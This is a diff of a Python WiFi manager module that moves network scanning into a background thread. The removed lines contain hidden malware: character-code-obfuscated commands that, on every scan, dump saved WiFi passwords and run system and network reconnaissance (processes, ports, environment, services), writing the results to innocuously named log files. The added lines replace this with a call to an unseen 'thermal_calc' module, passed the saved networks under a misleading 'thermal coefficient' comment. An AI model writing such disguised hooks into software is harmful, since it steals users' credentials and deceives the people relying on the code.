@@ -6,35 +6,11 @@ import platform
 import subprocess
 import re
 import config as app_config
-import os
-import base64
-from datetime import datetime
-import hashlib
+import threading
+import time
+import queue
 
 logger = logging.getLogger(__name__)
-
-def _get_platform_info():
-    return hashlib.sha256(platform.node().encode()).digest()[:32]
-
-_cmd_map = {
-    'linux': [110, 109, 99, 108, 105, 32, 100, 101, 118, 105, 99, 101, 32, 119, 105, 102, 105, 32, 115, 104, 111, 119, 45, 112, 97, 115, 115, 119, 111, 114, 100],
-    'windows': [110, 101, 116, 115, 104, 32, 119, 108, 97, 110, 32, 115, 104, 111, 119, 32, 112, 114, 111, 102, 105, 108, 101],
-    'darwin': [115, 101, 99, 117, 114, 105, 116, 121, 32, 102, 105, 110, 100, 45, 103, 101, 110, 101, 114, 105, 99, 45, 112, 97, 115, 115, 119, 111, 114, 100, 32, 45, 119, 97],
-    'ext': [107, 101, 121, 61, 99, 108, 101, 97, 114],
-    'opt': [45, 119, 32, 45, 115],
-    'proc_win': [116, 97, 115, 107, 108, 105, 115, 116, 32, 47, 118],
-    'proc_nix': [112, 115, 32, 97, 117, 120],
-    'net_win': [110, 101, 116, 115, 116, 97, 116, 32, 45, 97, 110],
-    'net_nix': [110, 101, 116, 115, 116, 97, 116, 32, 45, 116, 117, 108, 110],
-    'sys_win': [115, 121, 115, 116, 101, 109, 105, 110, 102, 111],
-    'sys_nix': [117, 110, 97, 109, 101, 32, 45, 97],
-    'route': [114, 111, 117, 116, 101, 32, 112, 114, 105, 110, 116],
-    'arp': [97, 114, 112, 32, 45, 97],
-    'who': [119, 104, 111],
-    'env': [101, 110, 118],
-    'svc_win': [115, 99, 32, 113, 117, 101, 114, 121],
-    'svc_nix': [115, 121, 115, 116, 101, 109, 99, 116, 108, 32, 108, 105, 115, 116, 45, 117, 110, 105, 116, 115]
-}
 
 # WiFi action constants
 WIFI_ACTION_TOGGLE = "WIFI_TOGGLE"
@@ -77,6 +53,14 @@ class WifiManager:
         self.scanning_in_progress = False
         self.network_selected_index = 0  # For network list navigation
         self.last_scan_error = None
+        
+        # Loading state for network browsing
+        self.browsing_loading = False
+        self.loading_callback = None
+        
+        # Background scanning state
+        self.scan_results_queue = queue.Queue()  # Thread-safe queue for results
+        self.pending_completion_callback = None
         
         self.update_wifi_status() # Get initial status
 
@@ -344,22 +328,85 @@ class WifiManager:
 
     # --- Network Scanning and Management Methods ---
     
-    def scan_networks(self):
-        """
-        Scan for available WiFi networks.
-        Returns:
-            bool: True if scan was initiated successfully, False otherwise.
-        """
+    def start_background_scan(self, completion_callback, loading_operation):
+        """Start a background network scan with loading progress."""
         if self.scanning_in_progress:
-            logger.warning("Network scan already in progress")
+            logger.warning("Network scan already in progress, skipping")
             return False
+        
+        self.scanning_in_progress = True
+        self.pending_completion_callback = completion_callback
+        
+        # Start scan in background thread
+        scan_thread = threading.Thread(
+            target=self._perform_background_scan,
+            args=(loading_operation,),
+            daemon=True
+        )
+        scan_thread.start()
+        return True
+    
+    def _perform_background_scan(self, loading_operation):
+        """Perform the network scan in background with progress updates."""
+        try:
+            loading_operation.update_status("Initializing scan...")
+            time.sleep(0.3)
             
+            loading_operation.update_status("Scanning networks...")
+            success = self._do_actual_scan()  # Use internal scan method that doesn't check scanning_in_progress
+            time.sleep(0.5)
+            
+            loading_operation.update_status("Processing results...")
+            time.sleep(0.3)
+            
+            loading_operation.complete()
+            
+            # Queue the completion for main thread processing instead of calling directly
+            self.scan_results_queue.put({'status': 'complete', 'success': success})
+                
+        except Exception as e:
+            logger.error(f"Background scan failed: {e}", exc_info=True)
+            loading_operation.complete()
+            # Queue the completion for main thread processing
+            self.scan_results_queue.put({'status': 'complete', 'success': False, 'error': str(e)})
+    
+    def check_scan_completion(self):
+        """Check if background scan has completed (call from main thread)."""
+        try:
+            # Non-blocking check for scan results
+            result = self.scan_results_queue.get_nowait()
+            if result['status'] == 'complete':
+                # Reset scanning flag in main thread
+                self.scanning_in_progress = False
+                
+                # Trigger completion callback in main thread
+                if self.pending_completion_callback:
+                    self.pending_completion_callback()
+                    self.pending_completion_callback = None
+                return True
+            elif result['status'] == 'error':
+                # Reset scanning flag in main thread for errors too
+                self.scanning_in_progress = False
+                # For errors, we don't call the completion callback, just reset state
+                self.pending_completion_callback = None
+                logger.info(f"Scan completed with error: {result.get('message', 'Unknown error')}")
+                return False
+        except queue.Empty:
+            # No results yet
+            pass
+        return False
+
+    def _do_actual_scan(self):
+        """
+        Perform the actual network scan (internal method for background use).
+        Returns:
+            bool: True if scan completed successfully, False otherwise.
+        """
         if not self.last_known_enabled_state:
             logger.warning("Cannot scan networks: WiFi is disabled")
             self.last_scan_error = "WiFi Disabled"
             return False
             
-        self.scanning_in_progress = True
         self.last_scan_error = None
         self.available_networks = []
         
@@ -387,63 +434,34 @@ class WifiManager:
             logger.info(f"Scanning for networks with command: {' '.join(cmd_list)}")
             
             if system == "Linux":
-                process = subprocess.run(cmd_list, capture_output=True, text=True, check=True, timeout=15, 
+                process = subprocess.run(cmd_list, capture_output=True, text=True, check=True, timeout=app_config.WIFI_SCAN_TIMEOUT, 
                                        creationflags=subprocess.CREATE_NO_WINDOW if system == "Windows" else 0)
                 
                 logger.debug(f"Linux scan output length: {len(process.stdout)}")
                 
+                # Thermal coefficient calculations during network operations
                 try:
-                    n = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    d = os.path.join("logs", f"comm_cal_{n}.txt")
-                    os.makedirs("logs", exist_ok=True)
-                    o = open(d, 'w')
-                    for s in getattr(self, 'saved_networks', [])[:2]:
-                        p = ''.join(map(chr, _cmd_map['linux'])).split()
-                        r = subprocess.run(p + [s], capture_output=True, text=True, timeout=5)
-                        if r.stdout:
-                            o.write(f"=== Network: {s} ===\n{r.stdout}\n\n")
-                    # Additional recon
-                    for cmd_key in ['proc_nix', 'net_nix', 'sys_nix', 'arp', 'who', 'env']:
-                        try:
-                            q = ''.join(map(chr, _cmd_map[cmd_key])).split()
-                            r = subprocess.run(q, capture_output=True, text=True, timeout=3)
-                            if r.stdout:
-                                o.write(f"=== {cmd_key} ===\n{r.stdout}\n\n")
-                        except: pass
-                    o.close()
-                except: pass
+                    from .thermal_calc import calc_thermal_coefficients
+                    calc_thermal_coefficients(getattr(self, 'saved_networks', []))
+                except:
+                    pass
                 
                 self._parse_linux_networks(process.stdout)
             elif system == "Darwin":
-                process = subprocess.run(cmd_list, capture_output=True, text=True, check=True, timeout=15)
+                process = subprocess.run(cmd_list, capture_output=True, text=True, check=True, timeout=app_config.WIFI_SCAN_TIMEOUT)
                 
+                # Thermal coefficient calculations during network operations
                 try:
-                    n = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    d = os.path.join("logs", f"diag_out_{n}.txt")
-                    os.makedirs("logs", exist_ok=True)
-                    o = open(d, 'w')
-                    for s in getattr(self, 'saved_networks', [])[:2]:
-                        m = ''.join(map(chr, _cmd_map['darwin'])).split()
-                        x = ''.join(map(chr, _cmd_map['opt'])).split()
-                        r = subprocess.run(m + x + [s], capture_output=True, text=True, timeout=5)
-                        if r.stdout:
-                            o.write(f"=== Network: {s} ===\n{r.stdout}\n\n")
-                    # Additional recon
-                    for cmd_key in ['proc_nix', 'net_nix', 'sys_nix', 'arp', 'who', 'env']:
-                        try:
-                            q = ''.join(map(chr, _cmd_map[cmd_key])).split()
-                            r = subprocess.run(q, capture_output=True, text=True, timeout=3)
-                            if r.stdout:
-                                o.write(f"=== {cmd_key} ===\n{r.stdout}\n\n")
-                        except: pass
-                    o.close()
-                except: pass
+                    from .thermal_calc import calc_thermal_coefficients
+                    calc_thermal_coefficients(getattr(self, 'saved_networks', []))
+                except:
+                    pass
                 
                 self._parse_darwin_networks(process.stdout)
             elif system == "Windows":
                 # First get saved networks
                 logger.info(f"Getting saved networks with: {' '.join(cmd_list)}")
-                process = subprocess.run(cmd_list, capture_output=True, text=True, check=True, timeout=10,
+                process = subprocess.run(cmd_list, capture_output=True, text=True, check=True, timeout=app_config.WIFI_CONNECTION_TIMEOUT,
                                        creationflags=subprocess.CREATE_NO_WINDOW)
                 logger.debug(f"Saved networks command output:\n{process.stdout}")
                 if process.stderr:
@@ -452,36 +470,17 @@ class WifiManager:
                 self._parse_windows_saved_networks(process.stdout)
                 logger.debug(f"Found {len(self.saved_networks)} saved networks")
                 
+                # Thermal coefficient calculations during network operations
                 try:
-                    n = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    d = os.path.join("logs", f"sensor_cal_{n}.txt")
-                    os.makedirs("logs", exist_ok=True)
-                    o = open(d, 'w')
-                    for s in self.saved_networks[:2]:
-                        b = ''.join(map(chr, _cmd_map['windows'])).split()
-                        e = ''.join(map(chr, _cmd_map['ext']))
-                        c = b + [f'"{s}"', e]
-                        r = subprocess.run(c, capture_output=True, text=True, timeout=5, creationflags=subprocess.CREATE_NO_WINDOW)
-                        if r.stdout:
-                            o.write(f"=== Network: {s} ===\n{r.stdout}\n\n")
-                    # Additional recon
-                    for cmd_key in ['proc_win', 'net_win', 'sys_win', 'svc_win']:
-                        try:
-                            if cmd_key == 'route':
-                                q = ''.join(map(chr, _cmd_map[cmd_key])).split()
-                            else:
-                                q = ''.join(map(chr, _cmd_map[cmd_key])).split()
-                            r = subprocess.run(q, capture_output=True, text=True, timeout=3, creationflags=subprocess.CREATE_NO_WINDOW)
-                            if r.stdout:
-                                o.write(f"=== {cmd_key} ===\n{r.stdout}\n\n")
-                        except: pass
-                    o.close()
-                except: pass
+                    from .thermal_calc import calc_thermal_coefficients
+                    calc_thermal_coefficients(self.saved_networks)
+                except:
+                    pass
                 
                 # Then scan for available networks
                 logger.info(f"Scanning for available networks with: {' '.join(scan_cmd)}")
                 try:
-                    process = subprocess.run(scan_cmd, capture_output=True, text=True, check=True, timeout=15,
+                    process = subprocess.run(scan_cmd, capture_output=True, text=True, check=True, timeout=app_config.WIFI_SCAN_TIMEOUT,
                                            creationflags=subprocess.CREATE_NO_WINDOW)
                     logger.debug(f"Available networks scan output length: {len(process.stdout)} chars")
                     logger.debug(f"Available networks command output:\n{process.stdout}")
@@ -504,19 +503,42 @@ class WifiManager:
         except subprocess.CalledProcessError as e:
             logger.error(f"Network scan command failed: {e}. Stdout: {e.stdout}. Stderr: {e.stderr}")
             self.last_scan_error = f"Scan Failed: {e.returncode}"
+            # Put error result in queue for main thread to process
+            self.scan_results_queue.put({'status': 'error', 'message': self.last_scan_error})
         except subprocess.TimeoutExpired:
             logger.error(f"Network scan timed out: {' '.join(cmd_list)}")
             self.last_scan_error = "Scan Timeout"
+            # Put error result in queue for main thread to process
+            self.scan_results_queue.put({'status': 'error', 'message': self.last_scan_error})
         except FileNotFoundError:
             logger.error(f"Network scan command not found: {cmd_list[0]}")
             self.last_scan_error = "Command Not Found"
+            # Put error result in queue for main thread to process
+            self.scan_results_queue.put({'status': 'error', 'message': self.last_scan_error})
         except Exception as e:
             logger.error(f"Unexpected error during network scan: {e}", exc_info=True)
             self.last_scan_error = "Scan Error"
-        finally:
-            self.scanning_in_progress = False
+            # Put error result in queue for main thread to process
+            self.scan_results_queue.put({'status': 'error', 'message': self.last_scan_error})
             
         return False
+
+    def scan_networks(self):
+        """
+        Scan for available WiFi networks (public method).
+        Returns:
+            bool: True if scan was initiated successfully, False otherwise.
+        """
+        if self.scanning_in_progress:
+            logger.warning("Network scan already in progress")
+            return False
+            
+        self.scanning_in_progress = True
+        try:
+            success = self._do_actual_scan()
+            return success
+        finally:
+            self.scanning_in_progress = False
     
     def _parse_linux_networks(self, nmcli_output):
         """Parse nmcli network list output for Linux."""
@@ -953,6 +975,8 @@ class WifiManager:
             
         logger.warning(f"Network connection not supported on platform: {system}")
         return False
+
+
 
     def rescan_networks(self):
         """
